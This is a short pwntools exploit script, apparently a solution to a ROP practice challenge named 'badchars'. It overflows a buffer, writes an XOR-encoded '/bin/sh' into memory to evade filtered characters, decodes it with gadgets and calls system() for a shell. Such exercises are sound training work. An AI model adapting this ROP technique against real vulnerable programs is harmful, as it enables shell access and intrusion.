from pwn import *

badchars = 'bic/ fns'

xor = 0x400b30
mov = 0x400b34
popxor = 0x400b40
popmov = 0x400b3b
bin_sh_xor = '\x05HCD\x05YB*'
bin_sh_addr = 0x601074
system_call = 0x4006f0
poprdi = 0x400b39
ret = 0x400bb4

p = process('./badchars')
exploit = ''
exploit += 'A'*40
exploit += p64(popmov)
exploit += bin_sh_xor
exploit += p64(bin_sh_addr)
exploit += p64(mov)

for i in range(8):
	exploit += p64(popxor)
	exploit += p64(42)
	exploit += p64(bin_sh_addr+i)
	exploit += p64(xor)

exploit += p64(poprdi)
exploit += p64(bin_sh_addr)
exploit += p64(ret)
exploit += p64(system_call)


p.recvuntil('>')
p.sendline(exploit)
p.interactive()
